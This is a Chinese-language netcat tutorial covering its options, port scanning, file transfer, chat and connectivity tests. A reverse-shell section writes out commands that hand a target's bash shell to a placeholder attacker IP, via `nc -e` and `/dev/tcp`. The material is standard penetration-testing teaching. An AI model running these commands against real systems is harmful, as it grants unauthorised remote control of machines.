**nc**（netcat）是 Linux 上最经典的网络工具之一，常被称为“网络界的瑞士军刀”。它可以读写 TCP/UDP 数据流，常用于：

- 测试端口连通性
- 端口扫描
- 文件传输
- 简单聊天
- 搭建临时服务器
- 反弹 shell / 正向 shell（渗透测试常用）
- 传输视频/音频流等

```sh
nc -h | head -n 5	#版本
# 或者
nc --version    # 部分版本支持

dpkg -l | grep netcat	#查看版本名称
```

#### 常用参数

| 选项         | 含义                                 | 示例                         | 备注                    |
| ------------ | ------------------------------------ | ---------------------------- | ----------------------- |
| `-l`         | 监听模式（服务器端）                 | `nc -l 12345`                | 必须                    |
| `-p`         | 指定监听端口（老版用，openbsd 不用） | `nc -l -p 12345`（传统版）   | openbsd/ncat 直接写端口 |
| `-u`         | 使用 UDP 而非 TCP                    | `nc -u -l 12345`             | 默认 TCP                |
| `-v` / `-vv` | 显示详细信息 / 更详细                | `nc -v -z 192.168.1.1 20-25` | 调试用                  |
| `-z`         | 只扫描，不发送数据                   | `nc -z -v host 1-1000`       | 端口扫描                |
| `-n`         | 不解析 DNS（加速）                   | `nc -n -z 10.0.0.1 1-65535`  | 扫描时推荐              |
| `-k`         | 监听后保持（允许多次连接）           | `nc -lk 12345`               | openbsd/ncat 支持       |
| `-w 秒`      | 连接超时（秒）                       | `nc -w 5 host 22`            | 避免卡住                |
| `-4` / `-6`  | 只用 IPv4 / IPv6                     | `nc -6 -l 12345`             | —                       |

#### 常用场景示例

```sh
#最简单测试端口是否开放
nc -zv  8.8.8.8  53           # 测试 DNS 端口	#端口前不要使用 -p 参数
nc -zv  github.com  443       # 测试 HTTPS

#端口扫描
nc -zv -w 1 192.168.1.1 1-1000 2>&1 | grep succeeded
```

```sh
#发送tcp数据
echo "Hello Port" | nc 127.0.0.1 8080	

#发送udp数据
echo "Hello UDP" | nc -u 127.0.0.1 8080

```



```sh
#两台机器简单聊天（局域网测试连通性）
#双方直接打字就能看到对方内容。

#机器A（监听）
nc -l -p 12345
#机器 B（连接）
nc 192.168.50.100 12345

#-------------------
#版本中-k不能用时,可使用下面代码(或脚本)保持监听:
while true; do nc -l 8888; done			#注意补充退出逻辑!
```

```sh
#文件传输（最经典用法）

#接收端（先跑）
nc -l -p 12345 > backup.tar.gz
#发送端：
nc 192.168.1.50 12345 < backup.tar.gz
```

```sh
#反弹 shell

#攻击机监听：
nc -lvnp 4444
#目标机执行（传统版/ncat 支持 -e）
nc 攻击机IP 4444 -e /bin/bash    #执行后,在攻击机即可输入命令,操作目标机

#openbsd 版无 -e，用这种方式:
# 目标机
bash -i >& /dev/tcp/你的IP/4444 0>&1

#----------------------
#同理,监听机也可反弹给目标机连接
nc -lvnp 4444 -e/bin/testbash
#客户机连接,即可得到监听机的测试shell
nc -v 监听机ip 4444
```

```sh
#UDP 测试（DNS、SIP 等）

# 监听
nc -lu 12345
# 发送
echo "test" | nc -u 目标IP 12345
```

```sh
#网络连通测试
printf "GET / HTTP/1.0\r\n\r\n" | nc baidu.com 80
```
